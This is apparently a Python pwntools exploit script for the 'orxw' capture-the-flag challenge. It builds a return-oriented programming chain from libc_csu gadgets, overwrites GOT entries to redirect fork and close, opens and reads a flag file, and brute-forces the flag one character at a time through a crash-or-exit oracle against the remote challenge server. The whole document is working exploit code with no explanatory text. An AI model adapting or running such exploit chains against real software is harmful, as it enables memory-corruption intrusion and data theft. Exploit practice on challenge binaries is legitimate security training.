#!/usr/bin/env python3
from pwn import *
from string import printable

context.arch = 'amd64'

def csu_gadget(func, rdi, rsi, rdx, rbp=1, rbx=None):
    if rbx == None:
        rbx = rbp - 1
    else:
        rbp = rbx + 1
    rop = flat(
        csu_pop,
        rbx, # rbx
        rbp, # rbp
        rdi, # r12
        rsi, # r13
        rdx, # r14
        func - rbx * 8, # r15
        csu_call,
    )
    return rop

def make_payload(guess_flag, idx):
    padding = b'a' * 0x10
    rbp = 0x404090
    buf = 0x404190
    flag_path = 0x404a10
    
    # overwrite fork@got to puts
    rop = flat(
        csu_pop,
        libc.symbols['puts'] - libc.symbols['fork'], # rbx
        fork_got + 0x3d, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
        add_prbp, # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    )

    # set rax to 0x404080
    # set rdi, rsi, rdx
    rdx = (fork_plt - 0x404080 + 0x10000)
    assert(rdx & 0xff00ff == 0)
    rop__do_global_dtors_aux = csu_gadget(p__do_global_dtors_aux, 0, 0, rdx)
    rop += rop__do_global_dtors_aux
    rop += flat(
        0, # add rsp, 8
        0, # rbx
        0, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
        add_ahdh, 
    )

    # check state, add 0 to it and check ZF
    # if child, ZF = 1
    # if parent, ZF = 0
    rop += flat(
        csu_pop,
        0, # rbx
        global_status + 0x3d, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
        add_prbp, # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
        pop_rdi,
        global_status + 1,
        je, # je 0x401016 ; call rax
        0x5487548754875487, # ZF = 0
        ret, # ZF = 1
    )

    # overwrite close@got to open
    rop += flat(
        csu_pop,
        libc.symbols['open'] - libc.symbols['close'], # rbx
        close_got + 0x3d, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
        add_prbp, # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    )

    # write flag path to bss
    flag_path_b = b'/home/orxw/flag'
    for i in range(0, len(flag_path_b), 4):
        rbx = flag_path_b[i:i+4].ljust(8, b'\0')
        rop += flat(
            csu_pop,
            rbx, # rbx
            flag_path + 0x3d + i, # rbp
            0, # r12
            0, # r13
            0, # r14
            0, # r15
            add_prbp, # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
        )

    # open flag
    open_got = close_got
    rop_open = csu_gadget(open_got, flag_path, 0, 0)
    rop += rop_open
    rop += flat(
        0, # add rsp, 8
        0, # rbx
        0, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
    )

    # read flag to buf
    rop_read = csu_gadget(read_got, 0, buf, 0x30)
    rop += rop_read
    rop += flat(
        0, # add rsp, 8
        0, # rbx
        0, # rbp
        0, # r12
        0, # r13
        0, # r14
        0, # r15
    )

    # if guess right, ZF = 1
    # if guess wrong, ZF = 0
    # bfc = ord('B') # Brute-Force Flag char
    gf  = guess_flag[-4:][::-1]
    bfc = int(gf.hex(), 16)
    rbx = ((0x1 << (len(gf)*8)) - bfc) << (32 - len(gf)*8)
    # log.info(f'bfc: {hex(bfc)}')
    # log.info(f'rbx: {hex(rbx)}')
    rop += flat(
        csu_pop,
        rbx, # rbx
        buf - 3 + idx + 0x3d, # rbp
        0, # r12
        0x5566, # r13
        0x5566, # r14
        0x5566, # r15
        add_prbp, # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
        je, # je 0x401016 ; call rax
        0x5487548754875487, # ZF = 0
        ret, # ZF = 1
    )

    rop += flat(
        pop_rdi,
        ord('G'),
        exit_plt,
    )

    payload = padding + p64(rbp) + rop

    return payload

fork_plt   = 0x401180
fork_got   = 0x404068
close_got  = 0x404050
read_got   = 0x404058
exit_plt   = 0x4010f0
global_status = 0x40408c
p__do_global_dtors_aux = 0x402e08

csu_pop  = 0x40156A
csu_call = 0x401550

add_ahdh = 0x00000000004011bd
add_prbp = 0x000000000040125c
pop_rdi  = 0x0000000000401573
je       = 0x0000000000401012 # je 0x401018 ; call rax
ret      = 0x000000000040101a

libc = ELF('./libc-2.31.so')

# MY_FLAG = b'BALSN{m4yb3_ORE_w1ll_b3_7h3_n3w_tr3nd???}'
MY_FLAG = b'BALSN{'
cand = '_}?!0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
end = 0
while True:
    for c in cand:
        try:
            # p = process('./orxw')
            p = remote('orxw.balsnctf.com', 19091)
            # p = process('./orxw', env={"LD_PRELOAD": "./libc-2.31.so"})

            tmpflag = MY_FLAG + c.encode()
            payload = make_payload(tmpflag, len(tmpflag)-1)

            p.sendafter(b'Can you defeat orxw?', payload)

            data = p.recvuntil(b'G')
            log.info("BINGO!: ")
            MY_FLAG = MY_FLAG + c.encode()
            log.info(MY_FLAG)

            if c == '}':
                end = 1
            break
        except EOFError:
            continue
    if end:
        break

